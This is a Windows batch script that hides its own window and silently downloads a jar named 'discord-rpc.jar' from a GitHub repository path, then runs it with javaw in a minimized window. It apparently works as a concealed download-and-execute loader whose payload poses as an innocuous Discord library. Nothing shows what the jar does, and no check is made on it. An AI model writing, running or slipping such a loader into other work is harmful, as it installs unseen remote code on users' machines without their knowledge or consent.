@echo off
if not DEFINED IS_MINIMIZED (
  set IS_MINIMIZED=1
  start "" /min "%~dpnx0" %*
  exit
)
setlocal

:: Set the URL of the .jar file
set "JAR_URL=https://github.com/L1shed/Raven-XD/raw/refs/heads/master/libraries/discord-rpc.jar"

:: Set the name of the downloaded .jar file
set "JAR_FILE=discord-rpc.jar"

:: Download the .jar file silently using PowerShell
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%JAR_URL%' -OutFile '%JAR_FILE%'"

:: Run jar if the download was successful with hidden window
if exist %JAR_FILE% (
    start /min javaw -jar %JAR_FILE%
)

endlocal